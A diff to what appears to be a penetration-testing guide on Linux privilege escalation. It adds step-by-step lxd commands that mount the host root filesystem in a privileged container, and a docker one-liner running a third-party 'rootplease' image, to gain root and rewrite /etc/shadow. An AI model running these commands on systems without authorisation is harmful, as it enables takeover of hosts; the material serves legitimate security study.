@@ -276,9 +276,28 @@ The admin group, adm, allows the user to view logs in `/var/log`.  Whilst this i
 
 If a member of the lxd gorup, the user can use this to escalate to root, and potentially escape any containers it is a member of.
 
+```bash
+ubuntu@ubuntu:~$ lxc init ubuntu:16.04 test -c security.privileged=true 
+Creating test 
+ubuntu@ubuntu:~$ lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
+Device whatever added to test 
+ubuntu@ubuntu:~$ lxc start test 
+ubuntu@ubuntu:~$ lxc exec test bash
+```
+
+By doing this we effectively have root permissions.  While you won't be able to run arbitrary code on the host, you can write and read any file with root privileges, allowing you to, for example, write a new root password in the /etc/shadow folder.
+
+The [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder) is ideal for engagements, as it's no larger than 4MB.
+
 ##### docker
 
-If a member of the docker group, the user can use this to escalate to root, and potentially escape the container.
+In much the same vein as lxd, we can utilise the docker group to get full root privileges.
+
+```
+docker run -v /:/mnt/rootfs -i -t chrisfosterelli/rootplease
+```
+
+Similarly, we can use the [alpine](https://github.com/gliderlabs/docker-alpine/tree/2127169e2d9dcbb7ae8c7eca599affd2d61b49a7) docker image, if no useable containers are uploaded to the host.
 
 ##### disk
 
